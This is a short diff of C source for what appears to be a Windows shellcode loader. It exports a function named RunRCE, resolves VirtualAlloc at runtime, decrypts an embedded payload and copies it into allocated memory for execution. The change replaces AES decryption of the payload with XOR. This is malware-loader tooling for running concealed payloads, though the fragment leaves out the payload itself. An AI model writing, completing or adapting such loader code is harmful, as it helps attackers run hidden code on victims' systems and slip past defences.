@@ -23,7 +23,7 @@ unsigned int s_vp_len = sizeof(s_vp);
 unsigned int s_ct_len = sizeof(s_ct);
 unsigned int s_wfso_len = sizeof(s_wfso);
 
-char my_payload_key[] = { };
+char my_payload_key[] = ""; //{ };
 char f_key[] = "";
 
 LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
@@ -97,7 +97,8 @@ __declspec(dllexport) BOOL WINAPI RunRCE(void) {
     exec_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     // Decrypt payload
-    AESDecrypt((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
+    // AESDecrypt((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
+    XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
     
     // Copy payload to allocated buffer
     RtlMoveMemory(exec_mem, my_payload, my_payload_len);
